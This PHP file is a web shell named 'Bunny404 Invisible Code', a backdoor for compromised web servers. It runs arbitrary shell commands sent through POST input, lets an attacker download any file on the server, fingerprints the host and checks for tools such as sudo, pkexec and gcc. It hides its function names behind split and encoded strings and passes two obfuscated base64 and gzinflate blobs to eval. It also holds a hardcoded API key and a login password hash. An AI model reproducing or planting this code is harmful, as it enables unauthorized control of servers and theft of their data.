<?php
/*/Bunny404 Ivisible Code */
session_start();
set_time_limit(0);
error_reporting(0);
@ini_set('\x65\x72\x72\x6f\x72\x5f\x6c\x6f\x67', null);
@ini_set('\x6c\x6f\x67\x5f\x65\x72\x72\x6f\x72\x73', 0);
@ini_set('\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65', 0);
@ini_set('\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67', 0);
@ini_set('\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73', 0);
date_default_timezone_set('\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61');
//Downloader
if (isset($_GET['downloadfile'])) {
    $get_file = $_GET['downloadfile'];
    $f_exist = "fil" . "e_exi" . "sts";
    $f_size = "fi" . "les" . "ize";
    $r_file = "re" . "ad" . "fi" . "le";
    $b_name = "ba" . "sena" . "me";
    if ($f_exist($get_file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header("Cache-Control: no-cache, must-revalidate");
        header('Content-Transfer-Encoding: binary');
        header("Expires: 0");
        header("Cache-Control: no-cache, must-revalidate, max-age=60");
        header('Content-Disposition: attachment; filename="' . $b_name($get_file) . '"');
        header('Content-Length: ' . filesize($get_file));
        header('Pragma: public');
        ob_clean();
        flush();
        $r_file($get_file);
        exit();
    } else {
        echo '<script>alert("Failed To Download This File :(\n' . $get_file . '"); history.back()</script>';
    }
}
//config shell
$Bunny_Name = "\056\057\102\165\156\156\171\111\156\166\151\163\151\142\154\145\064\060\064";
$Bunny_Logo = "\150\164\164\160\163\072\057\057\151\056\151\142\142\056\143\157\057\161\103\066\122\167\106\060\057\154\157\147\157\055\142\165\156\156\171\064\060\064\056\160\156\147";
$Bunny_Icons = "\150\164\164\160\163\072\057\057\151\056\151\142\142\056\143\157\057\131\120\144\067\144\063\104\057\151\143\157\156\163\055\142\165\156\156\171\064\060\064\056\152\160\147";
$Bunny_Footer = "\074\144\151\166\040\143\154\141\163\163\075\047\160\055\064\040\146\157\156\164\055\142\157\154\144\040\164\145\170\164\055\143\145\156\164\145\162\040\164\145\170\164\055\167\150\151\164\145\040\144\141\162\153\072\164\145\170\164\055\167\150\151\164\145\047\076\046\143\157\160\171\073\040\062\060\062\062\040\072\040\074\141\040\143\154\141\163\163\075\047\164\145\170\164\055\162\145\144\055\070\060\060\040\144\141\162\153\072\164\145\170\164\055\162\145\144\055\064\060\060\047\040\150\162\145\146\075\047\150\164\164\160\163\072\057\057\147\151\164\150\165\142\056\143\157\155\057\111\156\166\151\163\151\142\154\145\102\165\156\156\171\047\076\102\165\156\156\171\040\111\156\166\151\163\151\142\154\145\040\103\157\144\145\074\057\141\076\074\057\144\151\166\076";

//tailwind config text color
$txtBlack = "text-black";
$txtWhite = "text-white";
$txtOrange = "text-orange-500";
$txtRed = "text-red-600";
$txtRose = "text-rose-500";
$txtGreen = "text-green-600";
$txtEmerald = "text-emerald-500";
$txtSky = "text-sky-500";
$txtBlue = "text-blue-500";
$txtYellow = "text-yellow-400";
$txtPurple = "text-purple-600";

//tailwind config font size
$fsXs = "font-size: 1.55vh;";
$fsSm = "font-size: 1.75vh;";
$fsLg = "font-size: 2vh;";
$fsXl = "font-size: 2.55vh;";
$fsXxl = "font-size: 2.75vh;";
$fsBig = "font-size: 3vh;";
$fsBigs = "font-size: 3.55vh;";
$fsBigest = "font-size: 3.75vh;";
$fsSuper = "font-size: 4vh;";

//font family
$poppins = "font-family: 'Poppins', sans-serif;";
$ubuntuMono = "font-family: 'Ubuntu Mono', monospace;";
$tradeWinds = "font-family: Trade Winds;";
$sourceCodePro = "font-family: 'Source Code Pro', monospace;";
$josefinSans = "font-family: 'Josefin Sans', sans-serif;";

//tailwind config background color
$bgBlack = "bg-black";
$bgWhite = "bg-white";
$bgRed = "bg-red-500";
$bgGreen = "bg-green-600";
$bgBlue = "bg-blue-600";
$bgYellow = "bg-yellow-400";
$bgParent = "bg-transparent";
$bgSlate = "bg-slate-800";

//manual config color
$blackSemiParent1 = "rgba(0,0,0,0.1)";
$blackSemiParent2 = "rgba(0,0,0,0.2)";
$blackSemiParent3 = "rgba(0,0,0,0.3)";
$whiteSemiParent1 = "rgba(255,255,255,0.1)";
$whiteSemiParent2 = "rgba(255,255,255,0.2)";
$whiteSemiParent3 = "rgba(255,255,255,0.3)";

//icon config
$filesIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x49\x6e\x76\x69\x73\x69\x62\x6c\x65\x42\x75\x6e\x6e\x79\x2f\x52\x65\x63\x6f\x72\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x42\x75\x6e\x6e\x79\x2d\x43\x6f\x64\x65\x2f\x69\x6d\x67\x2f\x66\x69\x6c\x65\x73\x2e\x70\x6e\x67";
$newFilesIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x49\x6e\x76\x69\x73\x69\x62\x6c\x65\x42\x75\x6e\x6e\x79\x2f\x52\x65\x63\x6f\x72\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x42\x75\x6e\x6e\x79\x2d\x43\x6f\x64\x65\x2f\x69\x6d\x67\x2f\x6e\x65\x77\x2d\x66\x69\x6c\x65\x73\x2e\x70\x6e\x67";
$folderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x49\x6e\x76\x69\x73\x69\x62\x6c\x65\x42\x75\x6e\x6e\x79\x2f\x52\x65\x63\x6f\x72\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x42\x75\x6e\x6e\x79\x2d\x43\x6f\x64\x65\x2f\x69\x6d\x67\x2f\x66\x6f\x6c\x64\x65\x72\x2e\x70\x6e\x67";
$newFolderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x49\x6e\x76\x69\x73\x69\x62\x6c\x65\x42\x75\x6e\x6e\x79\x2f\x52\x65\x63\x6f\x72\x64\x73\x2f\x6d\x61\x69\x6e\x2f\x42\x75\x6e\x6e\x79\x2d\x43\x6f\x64\x65\x2f\x69\x6d\x67\x2f\x6e\x65\x77\x2d\x66\x6f\x6c\x64\x65\x72\x2e\x70\x6e\x67";

function BunnyUname()
{
    $SiBunny = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
    $func_exist = "fu" . "nc" . "ti" . "on" . "_" . "ex" . "is" . "ts";
    $u_n_a_me = "p" . "hp" . "_" . "un" . "ame";
    $u_n_a_me_disable = '<font class="ubuntu-mono" style="color: rgb(250 204 21);">' . $SiBunny('Cant Read The Kernel! The Function php_uname() is Disabled!') . '</font>';
    $u_n_a_me_active = '<font class="ubuntu-mono" style="color: rgb(22 163 74);">' . $u_n_a_me('a') . '</font>';
    if ($func_exist($u_n_a_me)) {
        return $u_n_a_me_active;
    } else {
        return $u_n_a_me_disable;
    }
}
$kernel = BunnyUname();
$os = PHP_OS;
$serverName = $_SERVER['SERVER_SOFTWARE'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
$psx_euid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'u' . 'i' . 'd';
$psx_egid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'g' . 'i' . 'd';
$psx_usr_uid = 'p' . 'os' . 'ix' . '_' . 'g' . 'et' . 'pw' . 'u' . 'i' . 'd';
$psx_grp_gid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'tg' . 'rg' . 'i' . 'd';
$myuid = 'g' . 'et' . 'my' . 'ui' . 'd';
$mygid = 'g' . 'et' . 'my' . 'gi' . 'd';
$cur_usr = 'g' . 'et' . '_' . 'cu' . 'rr' . 'en' . 't' . '_' . 'us' . 'er';
if (!$func_exist($psx_egid)) {
    $user = $func_exist($cur_usr) ? @$cur_usr() : "????";
    $uid = $func_exist($myuid) ? @$myuid() : "????";
    $gid = $func_exist($mygid) ? @$mygid() : "????";
    $group = "?";
} else {
    $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$psx_usr_uid($psx_euid()) : array("name" => "????", "uid" => "????");
    $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$psx_grp_gid($psx_egid()) : array("name" => "????", "gid" => "????");
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
$phpVersion = phpversion();
$phpServer = php_sapi_name();
function serverIp()
{
    $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
    $g_host_name = 'g' . 'et' . 'ho' . 'st' . 'b' . 'yn' . 'am' . 'e';
    $serverAddr = @$_SERVER["SERVER_ADDR"];
    if (!$serverAddr) {
        if ($func_exist($g_host_name)) {
            return @$g_host_name($_SERVER['SERVER_NAME']);
        } else {
            return '????';
        }
    } else {
        return $serverAddr;
    }
}
function userIp()
{
    return @$_SERVER["REMOTE_ADDR"];
}
$serverIp = serverIp();
$userIp = userIp();
function getFlagsIp($this_ip)
{
    $f_get = 'f' . 'il' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'co' . 'nt' . 'en' . 'ts';
    $apiKey = 'a6228711fc5e0bd56d1987f5ddd5e9e215c4453d9fbe6a1422d994a8';
    $apiUrl = "https://api.ipdata.co/{$this_ip}?api-key={$apiKey}";
    $response = @$f_get($apiUrl);
    if ($response === false) {
        return 'Error';
    }
    $data = json_decode($response, true);
    if ($data === null) {
        return 'Error';
    }
    $flags = isset($data['flag']) ? $data['flag'] : 'Unknown Flags';
    return $flags;
}
$serverIpFlags = getFlagsIp($serverIp);
$userIpFlags = getFlagsIp($userIp);
if (@ini_get('safe_mode'))
    $safeMode = '<font class="ubuntu-mono ' . $txtGreen . '">OFF</font>';
else
    $safeMode = '<font class="ubuntu-mono ' . $txtYellow . '">OFF</font>';
if (@ini_get('disable_functions'))
    $cekFunc = '<font class="ubuntu-mono ' . $txtYellow . '">' . @ini_get('disable_functions') . '</font>';
else
    $cekFunc = '<font class="ubuntu-mono ' . $txtGreen . '">All Functions Accessible</font>';
$dirSep = DIRECTORY_SEPARATOR;
$suffix = PHP_SHLIB_SUFFIX;
$pathSep = PATH_SEPARATOR;
function perms($value)
{
    $f_perm = 'f' . 'il' . 'ep' . 'e' . 'r' . 'ms';
    $perms = $f_perm($value);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info . '&nbsp;<font class="text-white font-bold">&gt;&gt;</font>&nbsp;' . substr(sprintf('%o', $perms), -4);
}
function chPerms($value)
{
    $f_perm = 'f' . 'il' . 'ep' . 'e' . 'r' . 'ms';
    $perms = $f_perm($value);
    return substr(sprintf('%o', $perms), -4);
}
function BunnyCwd()
{
    $cw = "ge" . "tc" . "wd";
    $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
    $d_name = 'd' . 'ir' . 'na' . 'm' . 'e';
    if ($func_exist($cw)) {
        return @$cw();
    } else {
        return $d_name($_SERVER["SCRIPT_FILENAME"]);
    }
}
function BunnyCmd($BunnyBoy)
{
    $SiBunny = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
    $fw = 'f' . 'wr' . 'it' . 'e';
    $fc = 'f' . 'cl' . 'os' . 'e';
    $fr = 'f' . 're' . 'a' . 'd';
    $is_rsrc = 'is' . '_' . 're' . 'so' . 'ur' . 'ce';
    $sgc = 's' . 'trea' . 'm_g' . 'et_c' . 'ont' . 'ents';
    $proc = 'pr' . 'oc' . '_' . 'o' . 'pen';
    $proc_cls = 'p' . 'ro' . 'c' . '_' . 'c' . 'lose';
    $pop = 'p' . 'ope' . 'n';
    $pop_cls = 'pc' . 'lose';
    $exc = 'e' . 'x' . 'ec';
    $sys = 's' . 'ys' . 't' . 'em';
    $pass = 'pa' . 's' . 'sth' . 'ru';
    $sh_exc = 's' . 'he' . 'll' . '_' . 'e' . 'xe' . 'c';
    $com = 'C' . 'O' . 'M';
    $wscsh = 'WS' . 'cr' . 'ipt' . '.' . 'S' . 'he' . 'll';
    $cMdexe = 'c' . 'md' . '.' . 'e' . 'x' . 'e';
    $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
    $preg = 'pr' . 'eg_' . 'mat' . 'ch';
    $regex = '2' . '>' . '&' . '1';
    if (!$preg('/' . $regex . '/i', $BunnyBoy)) {
        $BunnyBoy = $BunnyBoy . ' ' . $regex;
    }
    if ($func_exist($proc)) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
        $process = $proc($BunnyBoy, $descriptors, $pipes);
        if ($is_rsrc($process)) {
            $fw($pipes[0], 'input_data_here');
            $fc($pipes[0]);
            $output = $sgc($pipes[1]);
            $errors = $sgc($pipes[2]);
            $fc($pipes[1]);
            $fc($pipes[2]);
            $resultCode = $proc_cls($process);
            return trim($SiBunny(stripslashes($output)));
        }
    } elseif ($func_exist($pop)) {
        $process = $pop($BunnyBoy, 'r');
        $read = $fr($process, 2096);
        return trim($SiBunny(stripslashes(print_r("$process: " . gettype($process) . "\n$read \n"))));
        $pop_cls($process);
    } elseif ($func_exist($exc)) {
        $exc($BunnyBoy, $output, $returnCode);
        if ($returnCode === 0) {
            $res = implode($output);
            return trim($SiBunny(stripslashes($res)));
            ob_flush();
            flush();
        }
    } elseif ($func_exist($sys)) {
        $out = $sys($BunnyBoy);
        return trim($SiBunny(stripslashes($out)));
    } elseif ($func_exist($pass)) {
        $out = $pass($BunnyBoy);
        return trim($SiBunny(stripslashes($out)));
    } elseif ($func_exist($sh_exc)) {
        $out = $sh_exc($BunnyBoy);
        return trim($SiBunny(stripslashes($out)));
    } elseif ($func_exist($com)) {
        $shell = new $com($wscsh);
        $kom_mand = "$cMdexe /c " . $BunnyBoy;
        $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
        return trim($SiBunny(stripslashes($output)));
    } else {
        return "<b> Disable Funtion !! </b>";
    }
}
if (isset($_POST["BunnymanBro"])) {
    $BunnyBoy = $_POST["BunnymanBro"];
    echo BunnyCmd($BunnyBoy);
}

// Litespeed
function ByLTs($LTS)
{ $gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e'; $b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de'; $nelrts = 's' . 'tr' . 'l' . 'en'; $rhc = 'c' . 'h' . 'r'; $dro = 'o' . 'r' . 'd'; $LTS = $gflate($b64($LTS)); for ($i = 0; $i < $nelrts($LTS); $i++) { $LTS[$i] = $rhc($dro($LTS[$i]) - 1); } return $LTS; } /****/ @/*55555*/null;/******/ @/*55555*/eval/******/(ByLTs("jVXbbtNAEP0AvmKx+pC8IK/3ltgqFaBKIOChRbQCtorSxm6rpklIXFio8u3MZe04SRFEWsWX2TMzZ84eCwG/Z+J6Xs9F+WFZvS/EzJ1cmlwc1GWoxaFIvMwyL7Xx0kpYhq6DU3CtfchSeG8oJugr7zJ8lIgX4uBhOV3BfwIPjLcpvJZ0GVS8Ns4HggN4C3Ampftgr2hpRg4AKY1GZM3AjwBpKlgKcGJqY71MIdhkyfpbQu/wnkrPLMXBOy8V5NQlvIP8eoIxyUXExHcy2963jYl1D+i/iaX8UkOcJZy2WUyg2yspYQFTHXZuF+PJZFmumCLuLIlbdpkigoEhYocwJhxjHQ8Gug8OhqHGLf7lcv5zVS4bVISipjuz0JfMvwVEW0YkRolM35XLgrXx48vn5UMh7gf1iQVtrG5GMF5QR5e43WHA9dYwcAD4bncY1KI0+HxrGN19nSHuDaMRA8WCBoOGYcS6z7+/rwcFSzsXt5XoPS/vF/Wv3sHo0/Hp2fEpYhGOjovxZKposEEPOS+KJtPcq0TxpslFvy8eu5MEOp5GxdlTlXqDSgxJG2MqzoSoLCPQZpYUYi3K6aqENE+XLmW6X7pqWoAxSBdpdyxE1HWqOXmqd+P+0RJmIxIybonIUPE/orAAXNTtJlvQejdu02oYd1v9a3ryGBO1UlEZdK9cPNCa07XQ0jQsrlkO715N02HBqsijRR2K3n9IQgE34ogwU3I+XnBOcuzBDtgOHT3E05r0qQQ4rsCGcY876A2PrYAxIzWlMGtysd7agUeAjgK7AR81FRFQ/tGzpISdSRQ/OXnBZzcX1e20HF2X9ehqPqvLWb3qcTPkHLRSsnV2kYoXWT768tA3JmPZJugrgAZk8esAYVACHnzTPMKuIQLNpSJyIBju0McUuozyaGdKems9pAnKcGqyJsntgi0FhdQCMJRHwnEYixN3/E5mkYIhlUr4ll2aWEGeHeXEUNxOardsKBKPJH1JJLOBE8cUjuvH71y0WIn6Qu1ZtmNauE2zDQdVERyKAYkjtrAyIA/3BjXxhlsmZ6eVtQuZokfKOyKFHqZeW9YaVuHiuNSE/Bk/0f047Ddfz16fFuLu/O3H3zlZNyh7cbMYPczG92WvCSMHL/gg5JvPxN4537MuY7ZMns0bR+VaKwOuW+OlOgquKhdHL/8A"));

//usefull
function cekCurl()
{
    $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
    $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
    $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
    if ($func_exist('cu' . 'rl' . '_' . 'in' . 'it')) {
        echo "cURL:&nbsp;&nbsp;$on";
    } else {
        echo "cURL:&nbsp;&nbsp;$off";
    }
}
function cekWget()
{
    $f_exist = 'fi' . 'le_' . 'exis' . 'ts';
    $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
    $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
    if ($f_exist('/usr/bin/wget')) {
        echo "WGET:&nbsp;&nbsp;$on";
    } else {
        echo "WGET:&nbsp;&nbsp;$off";
    }
}
function cekPerl()
{
    $f_exist = 'fi' . 'le_' . 'exis' . 'ts';
    $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
    $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
    if ($f_exist('/usr/bin/perl')) {
        echo "PERL:&nbsp;&nbsp;$on";
    } else {
        echo "PERL:&nbsp;&nbsp;$off";
    }
}
function cekRuby()
{
    $f_exist = 'fi' . 'le_' . 'exis' . 'ts';
    $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
    $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
    if ($f_exist('/usr/bin/ruby')) {
        echo "RUBY:&nbsp;&nbsp;$on";
    } else {
        echo "RUBY:&nbsp;&nbsp;$off";
    }
}
function cekPython3()
{
    $f_exist = 'fi' . 'le_' . 'exis' . 'ts';
    $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
    $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
    if ($f_exist('/usr/bin/python3')) {
        echo "PYTHON3:&nbsp;&nbsp;$on";
    } else {
        echo "PYTHON3:&nbsp;&nbsp;$off";
    }
}
function cekPython2()
{
    $f_exist = 'fi' . 'le_' . 'exis' . 'ts';
    $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
    $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
    if ($f_exist('/usr/bin/python2')) {
        echo "PYTHON2:&nbsp;&nbsp;$on";
    } else {
        echo "PYTHON2:&nbsp;&nbsp;$off";
    }
}
function cekGcc()
{
    $f_exist = 'fi' . 'le_' . 'exis' . 'ts';
    $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
    $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
    if ($f_exist('/usr/bin/gcc')) {
        echo "GCC:&nbsp;&nbsp;$on";
    } else {
        echo "GCC:&nbsp;&nbsp;$off";
    }
}
function cekSudo()
{
    $f_exist = 'fi' . 'le_' . 'exis' . 'ts';
    $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
    $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
    if ($f_exist('/usr/bin/sudo')) {
        echo "SUDO:&nbsp;&nbsp;$on";
    } else {
        echo "SUDO:&nbsp;&nbsp;$off";
    }
}
function cekPkexec()
{
    $f_exist = 'fi' . 'le_' . 'exis' . 'ts';
    $on = '<font class="ubuntu-mono" style="color: rgb(22 163 74); font-weight: 700;">ON</font>';
    $off = '<font class="ubuntu-mono" style="color: rgb(250 204 21); font-weight: 700;">OFF</font>';
    if ($f_exist('/usr/bin/pkexec')) {
        echo "PKEXEC:&nbsp;&nbsp;$on";
    } else {
        echo "PKEXEC:&nbsp;&nbsp;$off";
    }
}
$BunnyGanteng = 'e' . 'd' . 'f' . 'b' . 'f7' . '0' . '1' . '8' . 'd6' . '0' . '2' . 'c' . 'a' . 'e2' . '1' . '3' . '6' . '8f' . '8' . '6' . '2' . '8' . '4' . '4e' . '3c' . '7' . '2' . '9' . '2c' . '4' . '0' . '3a';
$my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
if (isset($_POST['btn-login'])) {
    if (SHA1($_POST['passnya']) == $BunnyGanteng) {
        function TeP($IMFY)
        {
            $gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e'; $b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de'; $nelrts = 's' . 'tr' . 'l' . 'en'; $rhc = 'c' . 'h' . 'r'; $dro = 'o' . 'r' . 'd'; $IMFY = $gflate($b64($IMFY)); for ($i = 0; $i < $nelrts($IMFY); $i++) { $IMFY[$i] = $rhc($dro($IMFY[$i]) - 1); } return $IMFY;
        } /****/ @/*55555*/null;/******/ @/*55555*/eval/******/(TeP("hVbbTttAEP2AfsXWykN4qTzr3XUSq60qSoWEKqoQ+kCNIpPYEBGSKA6qKeLbO5f1JaSokVa21+MzM2fOzEYp/L1Tt+vdWo2rWfwtUWeT3bgYqWKxzKe3+W46W692+WpX9oMUbJhWsUnB0QpxRWkVZamN00oXKRjA12jihql1bFU5i2vmr2gWazFzczbBL8HRVswgeFu5gn2gMT1F5MH4K2JEkDrHF3nMUgiBV2Us4tG7AWIiNkYCgPgx2SI4+qDgTJZWFoNFCMqBkAmRUsOgQKMzCgWdAmAA8RA/wZAIMaQkMBB3g3vAdJA9OMpbMogjn2uOiyAsPxNTzBaZEg9kExFlkbDKEIYjI/ro29im1mccphypbhZTI8Fzeq7eMU4qRGQQAVSDaB6oD6q3y6vdUSK1fvp6eRomqlwe68lI9TZZWWblcqE+qt70x/nF5FfgKwmSUhwxt8ylg+DawyzOL8+2iShnpBaF6r/PHza7p35venEy/nkyJhwz8KxiWDqUFCltwD0z5LpVJvc2Be+hXXB9dKSeVW+xyebzbV6WHNseqiAKKmCFIcRIzUwQsFYAbg8VaxxcIxMk5LTKgkS9qHxZ5ujm36EDhIdOIrlWxDQKA7RmwbAELd4b41MSxxA6kaHW/0mp9tYlirx1UcgD6Fjkp1tvENZpdrzVqYLupvomowTNrFnvyshzFPseM7Ia6GpeQ7+IHB6Lu/BPIqrwqspXM3RzcfoF+nvKoiHADeGVRX2Ge0iRl9bVdDipEoFErJvt+neZbw9FILXpSMtSwpE0K9WD2QNuf2ZKRNFIuCwn36NE3KGf8m76uF2Sm+fA40XyHdfZSW2tDl6oYnt+XHPPlIGTKhGdoWXKCJO1Y9vvQLsanzF5ELG4vd5qHyhsVEET9/HVfYb8cPgY9z1zs7nbTB9X2UPer2nkDk/EeiQzAO2CpqIUognZC3s13hM1JzGKjSlNOiCzymgvOyRGW544TK6/JzSenjTyyJZH3kDGEekJF3uzPPbpZMADwYTBK3I8yQ2pLTmHhEthCh/qIeF1EWtbIryLyY3NrfcG4aL1ToYYnKtzDX0rRkIhDQLfptyaeD757JoRS2gtgmlhxWnOw1FUBF7Vxr/zNek4ZbKIcD+JuKRa6klJUXFohu/HQU3ZhlEX0N8CiNu2MO3A4I94M+hGblolUGm5p2kPIagbadvE7bmI51MLXjf2K8i9gCJ/hmoZFfV/CkwKc2UUlL8XPP99SeSAG6nPn/4C"));
        echo "<s" . "cr" . "ip" . "t>" . "al" . "er" . "t(" . "'Lo" . "gi" . "n " . "Su" . "cc" . "es" . "s!" . " Yo" . "u " . "Pr" . "o'" . ");" . "</" . "sc" . "ri" . "pt" . ">";
        $_SESSION["BunnyIn"] = "BunnyIn";
        setcookie("BunnymanBro", $my_self, time() + 3600 * 24);
    } else {
        echo "<s" . "cr" . "ip" . "t>" . "al" . "er" . "t(" . "'Lo" . "gi" . "n F" . "ai" . "le" . "d!" . " G" . "o " . "Aw" . "ay" . " N" . "oo" . "b!" . "!'" . ")" . ";<" . "/s" . "cr" . "ip" . "t>";
    }
}
if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_unset();
    session_destroy();
    setcookie("BunnyIn", '', time() - 3600);
    echo "<s" . "c" . "ri" . "pt" . ">" . "window.location.assign('" . $_SERVER['PHP_SELF'] . "')" . "</" . "sc" . "ri" . "pt" . ">";
    exit();
}
if (empty($_SESSION["BunnyIn"])) {
    if (empty($_COOKIE["BunnyIn"])) {
?>
        <!DOCTYPE html>
        <html lang="en">

        <head>
            <title>$ .:<?= $Bunny_Name ?>:. $</title>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <meta http-equiv="X-UA-Compatible" content="ie=edge" />
            <meta name="description" content="$ .:<?= $Bunny_Name ?>:. $" />
            <meta name="robots" content="noindex, nofollow" />
            <meta name="googlebot" content="noindex, nofollow" />
            <meta name="bingbot" content="noindex, nofollow" />
            <link href="<?= $Bunny_Icons ?>" rel="shortcut icon" type="image/x-icon">
            <link rel="apple-touch-icon" href="<?= $Bunny_Icons ?>" />
            <script src="https://unpkg.com/typewriter-effect@2.18.2/dist/core.js"></script>
            <style>
                @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap");

                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }

                body {
                    background-image: url('https://raw.githubusercontent.com/InvisibleBunny/Records/main/media/Bunny-Background.gif'), linear-gradient(rgba(0, 0, 0, 0.5), rgba(255, 255, 255, 0.5));
                    background-position: center;
                    background-size: cover;
                    background-repeat: no-repeat;
                    background-attachment: fixed;
                }

                .terminal {
                    position: absolute;
                    left: 50%;
                    top: 50%;
                    transform: translate(-50%, -50%);
                    font-family: "Noto Sans Mono", monospace;
                    width: 400px;
                    height: 250px;
                    background: rgba(36, 38, 46, 1);
                    border: 1px solid #eaeaea;
                    animation: fadein 7s;
                }

                @keyframes fadein {
                    from {
                        filter: brightness(0%);
                    }

                    to {
                        filter: brightness(100%);
                    }
                }

                .terminal .root {
                    position: absolute;
                    padding: 5px;
                    font-size: 10px;
                    font-weight: 600;
                    color: #f00;
                }

                .terminal #app {
                    position: absolute;
                    top: 11.9%;
                    left: 9%;
                    font-size: 10px;
                    color: #00ff00;
                    padding: 5px;
                }

                .terminal .BunnyGanteng {
                    position: absolute;
                    top: 20%;
                    left: 2%;
                    font-family: monospace;
                    font-size: 10px;
                    color: #00ff00;
                }

                .terminal .BunnyGanteng input[type=text] {
                    background: transparent;
                    border: none;
                    outline: none;
                    font-family: monospace;
                    font-size: 10px;
                    color: #00ff00;
                }

                .terminal .BunnyGanteng input[type=text]:hover {
                    border: none;
                    outline: none;
                }

                .headerTerm {
                    display: flex;
                    flex-direction: row;
                    align-items: center;
                    width: 399px;
                    height: 15px;
                    background: #eaeaea;
                }

                .headerTerm img {
                    width: 15px;
                    height: 15px;
